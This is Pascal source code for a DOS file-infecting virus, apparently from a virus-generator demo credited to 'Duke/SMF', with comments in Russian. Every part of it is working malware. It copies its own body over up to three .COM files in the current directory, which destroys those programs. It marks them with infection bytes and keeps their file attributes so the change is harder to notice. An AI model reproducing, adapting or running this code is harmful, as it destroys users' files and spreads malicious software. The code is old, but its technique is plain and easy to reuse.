uses dos;
const VirusSize= 4576 { Нужное вписать! };
      Max=3;
var Author,VirusName,Generator:string;
    ID1,ID2:byte;                        {метка зараженности}
    N:searchrec;
    Num:byte;                            {число пораженных файлов}
    VirusBody:array[1..VirusSize] of byte;
    Virus:file;
{------------------}
procedure Infect(i:string);              {Заражение файлов}
var g:file;
    attr:word;
begin
assign(g,i);
GetFAttr(g,attr);                        {сохранили прежние атрибуты}
SetFAttr(g,$20);                         {установка атрибута Arhive}
reset(g,1);                              {открыли файл-жертву}
blockwrite(g,VirusBody,VirusSize);       {записали поверх вирус}
seek(g,$0A);
blockwrite(g,ID1,1);                     {ставим метку зараженности}
blockwrite(g,ID2,1);
close(g);                                {закрыли файл-жертву}
SetFAttr(g,attr);                        {установили прежние атрибуты}
Num:=Num+1;
end;
{------------------}
procedure Check(i:string);
var g:file;
    y,z:byte;
begin
if copy(i,length(i)-10,11)='COMMAND.COM' then Exit;
assign(g,i);
reset(g,1);
seek(g,$0A);
blockread(g,y,1);
blockread(g,z,1);
close(g);
if (y<>ord(ID1)) or (z<>ord(ID2)) then Infect(i);
end;
{------------------}
procedure FindFileForKill;
begin
FindFirst('*.com',$21,N);
while doserror=0 do
  begin
  if Num=Max then Exit else  Check(N.name);
  FindNext(N)
  end;
end;
{------------------}
begin
Author:='Duke/SMF';
VirusName:='DPOG Demo Virus';
Generator:='[DPOG v0.01]';
ID1:=77;
ID2:=36;
Num:=0;
assign(Virus,paramstr(0));reset(Virus,1);
blockread(Virus,VirusBody,VirusSize);
close(Virus);
FindFileForKill;
writeln('This is DPOG demo virus');
writeln('Created (c) by Duke/SMF');
end.
